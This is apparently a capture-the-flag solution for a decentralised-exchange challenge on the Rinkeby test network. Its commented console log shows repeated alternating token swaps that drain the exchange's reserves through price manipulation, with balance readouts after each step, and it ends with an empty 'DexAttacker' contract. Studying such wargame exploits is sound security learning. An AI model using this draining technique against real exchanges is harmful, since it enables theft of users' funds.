// const tokenA = await contract.token1();
// undefined

// const tokenB = await contract.token2();
// undefined

// tokenA
// '0x0CB9D8842250575b2E549b89dC5183656F53f131'

// tokenB
// '0xeb65d10C2614B47F6E0422E58C9bec2169ab0bC5'

// await contract.swap(tokenA, tokenB, 10);
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xd0eaaefba13f69b66b45b9fb48bde91fa6df3434c2ffd3a8919137d62d9501f1
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xd0eaaefba13f69b66b45b9fb48bde91fa6df3434c2ffd3a8919137d62d9501f1
// {tx: '0xd0eaaefba13f69b66b45b9fb48bde91fa6df3434c2ffd3a8919137d62d9501f1', receipt: {…}, logs: Array(0)}

// let playerATokenA = await contract.balanceOf(tokenA, player)
// undefined
// playerATokenA.toString()
// '0'

// let playerATokenB = await contract.balanceOf(tokenB, player)
// undefined
// playerATokenB.toString()
// '20'

// let dexTokenA = await contract.balanceOf(tokenA, instance)
// undefined
// dexTokenA.toString()
// '110'

// let dexTokenB = await contract.balanceOf(tokenB, instance)
// undefined
// dexTokenB.toString()
// '90'

// await contract.swap(tokenB, tokenA, 20);
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0xdb2bb779ded7290ff4cdc0d4d1e16f77b043907e621d3f5a339a93b1a9906b3b
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0xdb2bb779ded7290ff4cdc0d4d1e16f77b043907e621d3f5a339a93b1a9906b3b
// {tx: '0xdb2bb779ded7290ff4cdc0d4d1e16f77b043907e621d3f5a339a93b1a9906b3b', receipt: {…}, logs: Array(0)}

// let playerTokenA = await contract.balanceOf(tokenA, player)
// undefined
// let playerTokenB = await contract.balanceOf(tokenB, player)
// undefined
// let dexTokenA = await contract.balanceOf(tokenA, instance)
// undefined
// let dexTokenB = await contract.balanceOf(tokenB, instance)
// undefined
// playerTokenA.toString()
// '24'
// playerTokenB.toString()
// '0'
// dexTokenA.toString()
// '86'
// dexTokenB.toString()
// '110'

// await contract.swap(tokenA, tokenB, 24);
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x9103d8e9ff0446858e164cd942b44fb7d1c0ee9979e40aaae4c57f442a0149b0
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x9103d8e9ff0446858e164cd942b44fb7d1c0ee9979e40aaae4c57f442a0149b0
// {tx: '0x9103d8e9ff0446858e164cd942b44fb7d1c0ee9979e40aaae4c57f442a0149b0', receipt: {…}, logs: Array(0)}

// let playerTokenA = await contract.balanceOf(tokenA, player)
// undefined
// let playerTokenB = await contract.balanceOf(tokenB, player)
// undefined
// let dexTokenA = await contract.balanceOf(tokenA, instance)
// undefined
// let dexTokenB = await contract.balanceOf(tokenB, instance)
// undefined
// playerTokenA.toString()
// '0'
// playerTokenB.toString()
// '30'
// dexTokenA.toString()
// '110'
// dexTokenB.toString()
// '80'

// await contract.swap(tokenB, tokenA, 30);
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/0x6a9c40962dd182863dabb80caa1f3416c607542233b822be61f9ced76a6693fa
// d1df01f2a54cd1e4b15599d3d87e9e4f6b604412.js:1 ⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/0x6a9c40962dd182863dabb80caa1f3416c607542233b822be61f9ced76a6693fa
// {tx: '0x6a9c40962dd182863dabb80caa1f3416c607542233b822be61f9ced76a6693fa', receipt: {…}, logs: Array(0)}

// let playerTokenA = await contract.balanceOf(tokenA, player)
// undefined
// let playerTokenB = await contract.balanceOf(tokenB, player)
// undefined
// let dexTokenA = await contract.balanceOf(tokenA, instance)
// undefined
// let dexTokenB = await contract.balanceOf(tokenB, instance)
// undefined
// playerTokenA.toString()
// '41'
// playerTokenB.toString()
// '0'
// dexTokenA.toString()
// '69'
// dexTokenB.toString()
// '110'

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DexAttacker {}
